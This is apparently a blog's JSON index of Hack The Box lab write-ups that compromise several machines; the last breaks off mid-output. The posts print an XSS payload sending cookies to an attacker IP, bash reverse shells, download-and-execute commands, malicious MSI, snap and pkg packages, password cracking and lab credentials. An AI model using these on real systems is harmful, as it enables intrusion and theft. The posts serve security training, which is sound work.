[ { "title": "Hack The Box - Schooled writeup", "url": "/posts/Schooled/", "categories": "Hack The Box, Machines", "tags": "subdomain, stored-xss, moodle, known-exploit, mysql, hashcat, pkg", "date": "2021-09-19 23:05:00 +0200", "snippet": "EnumerationStart with nmap enumeration$ nmap -sC -sV -oN nmap-initial 10.10.10.234Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 18:00 CESTNmap scan report for 10.10.10.234Host is up (0.027s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)| ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)| 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)|_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15|_http-title: Schooled - A new kind of educational instituteService Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsdService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.57 secondsWe write down the apache and php versionApache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)The website has been written in php, so we use dirbuster with php extension enabled.It doesn’t produce any interesting result.By enumerating all the remote ports, we discover another open port: 33060/tcp open mysqlxMysqlxMysqlx is an eXtended version of Mysql.We create a quick script to interact with the service. But We try to log in using the name of teachers we found in the website but none of them works.Given the presence of mysqlix, a database is running on the remote machine. So we repeat the directory enumeration with other possible extensions (db,conf). Again, gobuster is useless in this case.We keep enumeratingSubdomain enumerationA DNS zone transfer is not going to work as there is no DNS server listening in the target machine.We can however try to bruteforce the subdomains using gobuster vhost.In this mode, gobuster will visit each subdomain we provide with a wordlist file and based on the response it will decide whether the subdomain exists or notgobuster vhost -u http://schooled.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster-subdomain.txt -t 40It finds moodle.schooled.htb.We add it to the /etc/hosts file and we visit the root pageMoodle.schooled.htb We create an account and log in to Moodle.The mail we register needs to have a student.schooled.htb domain.Once logged in, we can register to the math course and look at the teacher’s profile. Now that we have the teachers’ domain, we can try to register to Moodle using a @staff.schooled.htb account. We may be able to get teacher role.Too easy to be true. It doesn’t work: `{: .shadow}Moodle enumerationWe fire up gobuster both on the root directory and under the moodle directorygobuster dir -u http://moodle.schooled.htb/moodle/ -w /usr/share/wordl[0/8]dirbuster/directory-list-2.3-medium.txt -o gobuster-moodle.txt -t 40 -x php,db We have a bunch of files but after a closer analysis none of them seems very useful.Instead, we find a tool for moodle enumeration: https://github.com/inc0d3/moodlescan.We run it with python3 moodlescan.py -k -u http://moodle.schooled.htb/moodle.The -k option ignores the certificate Version number is 3.9-beta.We can check if there are known exploits for Moodle 3.9-beta.Many Moodle vulnerabilities can be found here: https://snyk.io/vuln/composer:moodle%2FmoodleThere are a bunch of vulnerabilities for the 3.9.If we read the Math teacher’s announcement carefully, we can clearly guess what is the kind of vulnerability that may be exploited. As guessable by the announcment, the teacher will visit the student’s profile therefore suggesting an XSS vulnerability.PrivEsc from student role: XSS - CVE-2020-25627A high impact XSS vulnerability stands out for the unsufficient sanitization of the moodlenetprofile (also mentioned in the announement). We first try to confirm the vulnerability and it works We know the teacher will visit our profile. So we can exploit this vulnerability and make the teacher kindly send his session cookies to us.This time our payload is: &amp;lt;img src=x onerror=this.src=&#39;http://10.10.14.44:8000/?c=&#39;+document.cookie&amp;gt;We wait a bit and we get We set the new cookie and we can successfully log in as the teacher Manuel Philips PrivEsc from teacher role : CVE-2020-14321We look at vulnerabilities of moodle 3.9 beta again A Proof of Concept has been implemented here: https://github.com/HoangKien1020/CVE-2020-14321.We first enroll the IT teacher Jamie Borham (as we thought he had Manager role). We turn burp suite on and temper the request as shown in the PoC in order to self-assign Manager.(We are using userList[]=24 because 24 is the id of the Math teacher) Response is successful And we have manager role now Although we have Manager’s permission, we cannot login as Jamie Borham (probably he isn’t a Manager?).So we repeat the steps for the other teachers and we manage to get the Manager role by logging in as Lianne Carter It’s now time of RCE. We navigate to the plugins tab and install a new plugin as shown in the PoC.(We used the pentestermonkey php reverse shell as malicious payload) Visiting http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php: UserWe are in a freeBSD distro.We start by stabilizing the shell:$ find . -iname python3 2&amp;gt;/dev/null./usr/local/bin/python3./usr/local/share/bash-completion/completions/python3$ /usr/local/bin/python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;[www@Schooled /]$ We run linpeas. curl is in /usr/local/bin/./usr/local/bin/curl http://10.10.14.217:9002/linpeas.sh | /bin/bashWe find the credentials of the mysql database: We can log in take username and passwords from mdl_user table We are interested to these ones: And in particular to the admin’s password (Jamie)We can crack the hash using hashcat.The algorith used for the hash is bcrypthashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt --usernameWe manage to crack the hash:$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt --username --showadmin:$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsxRoot The pkg install * is indeed very suspicious there.We can look it up on GTFObins and easily follow the instructions.We create the file containing our reverse shell (I tried a couple of them before finding one that actually worked) Then we create the freeBSD malicious package with fpm -n x -s dir -t freebsd -a all --before-install pwn/pwn.sh pwnWe can send the package to the machine with scpTo install the package on the remote host and trigger our malicious code: jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txzThe reverse shell works and we are root now.$ nc -lnvp 4242listening on [any] 4242 ...connect to [10.10.14.217] from (UNKNOWN) [10.10.10.234] 15762# whoamiroot" }, { "title": "Hack The Box - Knife writeup", "url": "/posts/Knife/", "categories": "Hack The Box, Machines", "tags": "known-exploit, php", "date": "2021-08-30 16:09:00 +0200", "snippet": "In this post we explore the Knife machine hosted on the HackTheBox website. We first scan the machine to enumerate the open ports and the respective running services.Analyze and DiscoveryWe start with an nmap enumeration. The -sC flag enables the usage of the default nmap scripts and the -sV flag enables the service and version discovery.&amp;gt; nmap -sC -sV -oN nmap-initial 10.10.10.242Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 09:49 CESTNmap scan report for 10.10.10.242Host is up (0.024s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Emergent Medical IdeaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.26 secondsTwo ports results to be open: port 22 for the ssh service and 80 which hosts an Apache web service.Visiting the webserver we land on the following page: The attack surface is very small as there aren’t any input fields nor clickable links. The tabs on the top right of the page are not actually implemented.We can easily figure out that the website’s backend language is PHP by noticing that the landing page is called index.php. This information may be useful in the future to tailor our enumeration/attacks.We can gather further information on the resources hosted on the webserver by enumerating files or directories served on port 80. For this purpose, we can use gobuster and perform a dictionary-based brute force enumeration. As we know that the web server is written in php, it may contain files ending with .php. It may be useful to tell gobuster to also append the .php extension to the dictionary entries. The -x flag enables such feature.The full gobuster command isgobuster dir -u http://10.10.10.242 -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 50 -o gobuster-port80.txtHowever the directory enumeration didn’t return any valuable results.We can still examine the requests and responses generated when visiting the index.php page and see whether we can spot any anomalies.We open the Firefox developer tools and navigate to the Network tab. Here we can see the request sent by the browser to the server to request the index.php page and its respective response. The X-Powered-By HTTP response header leaks the PHP version in use Now that we know the specific version of php used, namely php 8.1.0-dev, we can google for known vulnerabilities.Our search produced a very interesting result: It confirms that the current version is vulnerable and contains a backdoor that may cause remote code execution. What we need to do is finding this backdoor and exploit it.Insight into the PHP backdoorIn exploitDB we can find the reference to the malicious commit that introduced the backdoor in the PHP code base. (ExploitDB).The backdoor is contained in the following code snippet: As we can easily spot, the content of the HTTP_USER_AGENTT is scanned for the zerodium string. If the string is found, then the content after the first 8 bytes is evaluated.So, if we build our HTTP_USER_AGENTT such that it starts with zerodium (8 bytes) than we will be able to execute the remaining bytes.Attacking and TinkeringWe know that the payload after the zerodium string will be executed in the server. Therefore we can embed a reverse shell to gain a shell in the remote machine.The server machine is running Ubuntu (as we can see from the nmap output), so we can use a simple tcp reverse shell that starts a connection to our local machine: bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.19/9001 0&amp;gt;&amp;amp;1.(10.10.14.19 is the ip address of our local machine in the HTB network).Indeed, we need to setup a tcp listener in our local machine to listen on port 9001 for the incoming connection. It can be done using netcat: nc -lnvp 9001.The listener is ready, we can now trigger the backdoor.We embed our reverse shell into the User-Agentt header using BurpSuite. And we get the callback An alternative to BurpSuite is the curl linux command. However, it would not be a very pleasant experience as one needs to pay close attention on escaping quotes.We now have a shell as the james user. We can get the user flag by printing the /home/james/user.txt file.Privilege EscalationWe can scan the machine for possible privilege escalation vectors.Before using any Linux enumeration scripts, we can try to see which commands the user james can execute as another user. It can be done using the sudo -l command. As we can see from the command’s output, we can execute the knife binary as root without the need to provide a password.But what is knife? (More information on Chef Documentation website )The documentation is indeed a useful resource to look at. It may be possible to find exploit vectors.As expected, going through the documentation highlighted an exploitable feature of the knife binary. It looks like we can execute arbitrary Ruby code: Therefore we run the binary as root and spawn a shell using Ruby code.james@knife:/$ sudo knife exec -E &#39;exec &quot;/bin/bash&quot;&#39;sudo knife exec -E &#39;exec &quot;/bin/bash&quot;&#39;$ whoamirootWe managed to get root, flag is in /root/root.txtReflection on the securityIn this section we highlight the security weaknesses that allowed us to get full control over the remote server. Moreover, we propose solutions to mitigate and patch such vulnerabilitiesSecurity weaknesses and recommendations We managed to get a foothold in the target machine by exploiting an outdated version of PHP which contained a known backdoor. The vulnerability is extremely easy to exploit and allows an unauthenticated attacker to remotely gain access to the server’s OS. Given the high impact and easiness of exploitation, the vulnerability can be classified as high risk and should be immediately patched. We advice to always keep the software up to date. Publicly facing web servers should have high priority and be updated daily as they are the first point of entry to the machine. The X-Powered-By leaks the PHP version in use, thus easily giving out extra information to the attacker. Such header should be immediately suppressed. Without the info about the PHP version the attacker would have had a harder time breaking into the machine. However security by obscurity is never a good solution and the problem should be fixed at the root (keep the software up to date). We managed to escalate our privileges by exploiting an over permissive rule in the sudoers file. Such rule allowed the james user to execute the knife binary as root without the need of a password. Such configuration together with the large variety of features exposed by the binary, easily allow an attacker to gain full control over the machine.It is still unclear why the sudoers file contained such entry but it is definitely an over permissive rule which does not follow the minimality principle.It’s highly likely that the system administrator lazily set up the knife sudo permissions without taking security into account.In case the james user is required to execute part of the knife features, we advice to configure the sudoers file in a more granular way, giving the users access to the required features only, and only after an accurate analysis of such features. " }, { "title": "Hack The Box - Love writeup", "url": "/posts/Love/", "categories": "Hack The Box, Machines", "tags": "ssrf, lfi, known-exploit, file-upload, rce, windows, powerup, msfvenom, always-install-elevated, misconfiguration, malicious-msi", "date": "2021-08-17 19:24:00 +0200", "snippet": "Start with usual nmap enumeration$ nmap -sC -sV -oN nmap-initial 10.10.10.239Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 17:42 CESTNmap scan report for 10.10.10.239Host is up (0.013s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: Voting System using PHP135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after: 2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql?| fingerprint-strings: | LDAPSearchReq, NotesRPC: |_ Host &#39;10.10.14.217&#39; is not allowed to connect to this MariaDB server5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=5/25%Time=60AD1AF0%P=x86_64-pc-linux-gnu%r(LDSF:APSearchReq,4B,&quot;G\\0\\0\\x01\\xffj\\x04Host\\x20&#39;10\\.10\\.14\\.217&#39;\\x20is\\x20noSF:t\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(NoSF:tesRPC,4B,&quot;G\\0\\0\\x01\\xffj\\x04Host\\x20&#39;10\\.10\\.14\\.217&#39;\\x20is\\x20not\\x20SF:allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;);Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h41m34s, deviation: 4h02m31s, median: 21m33s| smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)| OS CPE: cpe:/o:microsoft:windows_10::-| Computer name: Love| NetBIOS computer name: LOVE\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-05-25T09:04:20-07:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-05-25T16:04:16|_ start_date: N/AWe have 3 web servers but we are only allowed to visit the one hosted on port 80. We get Forbidden for all the others.We can extract some info from the SSL certificate We proceed to add the 2 love.htb domains to the /etc/hosts file.If we visit http://staging.love.htb we are redireced to the following page: In the demo tab we can specify a file from our machine and its content gets displayed Let’s try with a more interesting payload: &amp;lt;script&amp;gt;alert(&quot;hey&quot;);&amp;lt;/script&amp;gt; Here we go, we can inject javascrypt.What about php? We try with: &amp;lt;?php phpinfo(); ?&amp;gt;Nope it doesn’t workSo we could: Find a way to have code execution Include a local file to get its contentLocal file inclusion (LFI) Remember that we were forbidden to access the page on port 5000. We try that one And we have some admin credentials: admin:@LoveIsInTheAir!!!!We go to the administration page we previously found with gobuser, namely http://love.htb/admin/.We enter the credentials and we are in.Voting administration portal Seems that Neovic Devierte is the name of the admnisrator The website has been produced by Sourcecodemaster By googling we find that this version of Voting system has a RCE exploit in Exploit DB We have file upload vulnerability in the candidate page, so we create a candidate and upload our reverse shell (The target machine is a Windows host, so we need a reverse shell for windows. A php reverse shell will work fine as php files are executed by Apache). We used https://github.com/ivan-sincek/php-reverse-shell. Meanwhile we also set up a meterpreter listener:use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 10.10.14.217set lport 9001runThen we upload the file and get the callback We get a shell as the Phoebe userWe can go in the Phebe desktop folder and get the user flagRootWe first try to upgrade our shell to a meterpreter shell but unsuccessfullyThen we start the windows enumerationWe used PowerUp.Invoking all the checks:C:\\Users\\Phoebe&amp;gt;powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.224:8000/PowerUp.ps1&#39;); Invoke-AllChecks [.....] Check : AlwaysInstallElevated Registry Key AbuseFunction : Write-UserAddMSI [.....] The AlwaysInstallElevated registry key is up. It allows non-priv users the ability to install .msi packages with elevated permissions.EoPCreate malicious msi using msfvenom$ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.224 LPORT=9002 -f msi -o escalate.msi[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of msi file: 159744 bytesSaved as: escalate.msiTransfer file to target machinepowershell Invoke-WebRequest -Uri http://10.10.14.224:8000/escalate.msi -OutFile escalate.msiThen execute the malicious msi " }, { "title": "Hack The Box - Armageddon writeup", "url": "/posts/Armageddon/", "categories": "Hack The Box, Machines", "tags": "outdated-software, known-exploit, metasploit, drupal, john-the-ripper", "date": "2021-08-03 12:38:00 +0200", "snippet": "Start with usual nmap enumeration&amp;gt;&amp;gt; nmap -sV -sC -oN nmap-initial 10.10.10.233PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)| 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Welcome to Armageddon | ArmageddonService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.74 secondsFootholdIt is possible to notice some exposed resources from the output of nmap. The file CHANGELOG.txt reports that the Drupal version in use is the 7.56, whose last update was in 2017.It tells us that the service has not been updated for a while. Thus we look for vulnerabilities in Drupal.&amp;gt;&amp;gt; searchsploit drupal 7.56 -------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------- --------------------------------- Drupal &amp;lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code (Metasploit) | php/webapps/44557.rb Drupal &amp;lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code Execution (PoC) | php/webapps/44542.txt Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execu | php/webapps/44449.rb Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution (Met | php/remote/44482.rb Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution (PoC | php/webapps/44448.py Drupal &amp;lt; 8.5.11 / &amp;lt; 8.6.10 - RESTful Web Services unserialize() Remote Command | php/remote/46510.rb Drupal &amp;lt; 8.6.10 / &amp;lt; 8.5.11 - REST Module Remote Code Execution | php/webapps/46452.txt Drupal &amp;lt; 8.6.9 - REST Module Remote Code Execution | php/webapps/46459.py -------------------------------------------------------------------------------- --------------------------------- We are looking for remote code execution. Drupalgeddon3 seems to be what we really need.Using metasploitThe exploit is also available as a metasploit module: unix/webapp/drupal_drupalgeddon2 We set the options and run the exploit. We get a meterpreter shell as the apache userThe exploit can be easily performed without metasploit. Try it if you want more insights on the vulnerability and how the exploit works.Alternatively, you can set the proxy option in the meterpreter module, pointing to your proxy (e.g. Burp). You can then study the traffic to analyze what the exploit is doing.UserBy printing the /etc/passwd file we find out that the machine has a user named brucetherealadmin.brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bashThe file .gitignore lists some interesting files that is worth looking at.One of them is the sites/ directory.We analyze the content of this directory and after some minutes of manual search, we found in sites/all/settings the password of drupaluser for the mysql database.$databases = array ( &#39;default&#39; =&amp;gt; array ( &#39;default&#39; =&amp;gt; array ( &#39;database&#39; =&amp;gt; &#39;drupal&#39;, &#39;username&#39; =&amp;gt; &#39;drupaluser&#39;, &#39;password&#39; =&amp;gt; &#39;CQHEy@9M*m23gBVj&#39;, &#39;host&#39; =&amp;gt; &#39;localhost&#39;, &#39;port&#39; =&amp;gt; &#39;&#39;, &#39;driver&#39; =&amp;gt; &#39;mysql&#39;, &#39;prefix&#39; =&amp;gt; &#39;&#39;, ), ), ); We first try the password with brucetherealadmin in ssh but does not work.As expected, the credentials are valid for the mysql database.I couldn’t access the database interactively because the shell froze after each attempt. So I wrote an inline mysql command to get the names of the tables:mysql -u drupaluser -p drupal -e &quot;show tables;&quot;The database has a bunch of tables. We proceed by dumping the Users table and getting the password hash of brucetherealadmin.bash-4.2$ mysql -u drupaluser -p drupal -e &quot;select name,pass,mail from users;&quot;Enter password: name pass mailbrucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eukera $S$D4fb5rvwm0575Wnd4tgE.vhQ7xMjPiK0g/yC5xbH2EXQe7lKx22R kera@local.hostxsombi $S$DdWvgfvc2Sv4BChUQLYUpvbvL5poB/6y0A0j.7OrlPnGRDEoaUCx xsombi@mail.comblafucker $S$DtI2o1d6OJzZn6cn4TlFBuGpCskt6VYkbE21YiemNVCtNoJGiM3Y bla@bla.comThe hash is in Drupal7 format, which is not available in hashcat but it’s supported by John the Ripper.john --format=Drupal7 --wordlist /usr/share/wordlists/rockyou.txt hashIn less then a second we get the cracked password: boobooWe can now login to brucetherealadmin in ssh and get the flag.RootWe enumerate which commands the user brucetherealadmin can execute as sudo.As we see from the output of sudo -l, the user can execute sudo snap install * without being asked for a password. The * means that any argument can be passed.Such behavior looks quite odd. We look in GTFObins to see if it can be exploitable.Turns out that we can build our own malicious snap package and install it in the victim machine, triggering code execution under the root user.We slightly modify the GTFO script to print the root flag ( a reverse shell could have been injected too), and we run it in the host machine. The malicious snap package will be created.COMMAND=&#39;cat /root/root.txt&#39;init_dir=$(pwd)temp=$(mktemp -d)cd $tempmkdir -p meta/hooksprintf &#39;#!/bin/sh\\n%s; false&#39; &quot;$COMMAND&quot; &amp;gt;meta/hooks/installchmod +x meta/hooks/installfpm -n namesnap -s dir -t snap -a all metacp $temp/namesnap* $init_dirWe transfer the package just created to the victim machine and we install it.Install the snap package:[brucetherealadmin@armageddon tmp]$ sudo snap install /tmp/out.snap --dangerous --devmode error: cannot perform the following tasks:- Run install hook of &quot;namesnap&quot; snap if present (run hook &quot;install&quot;: 44ea752ae10856a7f3200e0e7718d898)The –dangerous flag is required because the snap is not signed by the Snap Store. The –devmode flag acknowledges that you are installing an unconfined application.The root flag is displayed." }, { "title": "Hack The Box - TheNotebook writeup", "url": "/posts/TheNotebook/", "categories": "Hack The Box, Machines", "tags": "jwt, docker, known-exploit", "date": "2021-08-03 11:40:00 +0200", "snippet": "FootholdWe start with usual nmap enumeration$ nmap -sC -sV -oN nmap-initial 10.10.10.230Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 21:53 CESTNmap scan report for 10.10.10.230Host is up (0.030s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)| 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: The Notebook - Your Note Keeper10010/tcp filtered rxapiService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.28 secondsThe web server is running nginx version 1.14.0.This version is only vulnerable to some DDOS attacks, not what we’re looking for. So we move on.On port 80 we land on the main page We register as a new user to the website. Once the registration completes successfully the view changes We now have the possibility to write our own notes.We fire up dirbuster on http://10.10.10.230 with directory medium size, enabling php extension and blank extension.We find a couple of files:File found: /login - 500File found: /register - 500File found: /admin - 403File found: /static/book.svg - 200File found: /logout - 302The admin directory is particularly interesting. However when we try to browse it, we get ‘Forbidden’ .I’s time to use our dirbuster again, this time on the /admin/ subdirectory.Again we find a couple of entries/admin/notes/aadmin/upload/admin/notesWe end up in the admin notes section We play a bit with the notes as registered and unregistered user, causing some Internal Server Error every now and then.Nothing that we can exploit though./login pageWe try to log in with default credentials (admin:password).The pair is not valid but we get to know that the admin user actually exists thanks to the error message If the username is not correct, the website will answer with a Login Failed! Reason: User doesn&#39;t exist..We can try to bruteforce the password using hydrahydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.230 http-post-form &quot;/login:username=^USER^&amp;amp;password=^PASS^:Incorrect Password&quot; -vBut no luck.Auth cookiesAuth cookies are set when we register to the website.We take the auth token and decode it base64$ echo -n &#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImFudG9uaW8iLCJlbWFpbCI6ImFudG9uaW8uc2FjY29AZ21haWwuY29tIiwiYWRtaW5fY2FwIjowfQ.pP5n0gq91-BWVBMUHkEEpBW4NzkLT_9fmYqzdoLhkySKB4iBVAS3OnLbnK8RyeP2AibzKLJ1X1d2JXqhGugGgt2cuCooYKG2kMhfucVQOHA1pwQa8AVnJZInMJo6DRYl7qvc4iiZCZHcAhgCJUgwvrhxnyPgoHuftIgBHFDjuc3I2MLyZweX4ifqqj23GbQM8EurTnubI4omXOQyGPQmS97DuJLYDjyNI_9L3ttrz2s0bLzoGa-7PdIYB-uuv27QfcDUDs9n2tEuYRc4RmOkL0d02TfD60Ya5HPhmhbO7ZT7EHm5schlFkgU2rrHZFWZuJc7Pum3CNcm5c-qodvB0hN89qjhB74p0DAror25dIXVQyT6kqZu53o09UWnHPzBFlCUAf5LUx0mVAor83JtGgsGKrHiLNqncZtdkPizAmy0m5WLcYuIUwLLMTP6zF0CEoRbqk5x1-RpTXPcnhOoq-OKiaTu-QU1RGE8nx4Iw8GeQFxdYpLJbFp47u9UFkzc8dYM9jPwquiBSxy-6A6KkjhcQJ8QLJZ5-S5nh2RjBHbHsvrJXwuij5sIWUz2hx1ixobAVueqweoNRCew9V4_uEt3jLsbg0_iiAO3ucKdLuiUYzYgojPKsU4Tb_fQk2qQ1uk6jKbOKiyW6cxFZx-6IKB07Kf-8VAhqKwF-ZSq-zQ;&#39; | base64 -d{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;kid&quot;:&quot;http://localhost:7070/privKey.key&quot;}base64: invalid inputIt’s a JWT (JSON web token).The JWT token has the form xxxx.yyyy.zzzz, where xxxx is the header, yyyy the payload and zzzz the signature on header + payload.We can thus split the auth token in 3 and decode them:$ echo -n &#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImFudG9uaW8iLCJlbWFpbCI6ImFudG9uaW8uc2FjY29AZ21haWwuY29tIiwiYWRtaW5fY2FwIjowfQ.pP5n0gq91-BWVBMUHkEEpBW4NzkLT_9fmYqzdoLhkySKB4iBVAS3OnLbnK8RyeP2AibzKLJ1X1d2JXqhGugGgt2cuCooYKG2kMhfucVQOHA1pwQa8AVnJZInMJo6DRYl7qvc4iiZCZHcAhgCJUgwvrhxnyPgoHuftIgBHFDjuc3I2MLyZweX4ifqqj23GbQM8EurTnubI4omXOQyGPQmS97DuJLYDjyNI_9L3ttrz2s0bLzoGa-7PdIYB-uuv27QfcDUDs9n2tEuYRc4RmOkL0d02TfD60Ya5HPhmhbO7ZT7EHm5schlFkgU2rrHZFWZuJc7Pum3CNcm5c-qodvB0hN89qjhB74p0DAror25dIXVQyT6kqZu53o09UWnHPzBFlCUAf5LUx0mVAor83JtGgsGKrHiLNqncZtdkPizAmy0m5WLcYuIUwLLMTP6zF0CEoRbqk5x1-RpTXPcnhOoq-OKiaTu-QU1RGE8nx4Iw8GeQFxdYpLJbFp47u9UFkzc8dYM9jPwquiBSxy-6A6KkjhcQJ8QLJZ5-S5nh2RjBHbHsvrJXwuij5sIWUz2hx1ixobAVueqweoNRCew9V4_uEt3jLsbg0_iiAO3ucKdLuiUYzYgojPKsU4Tb_fQk2qQ1uk6jKbOKiyW6cxFZx-6IKB07Kf-8VAhqKwF-ZSq-zQ;&#39; | sed &quot;s/\\./\\n/g&quot; | base64 -d | jqbase64: invalid input{ &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: 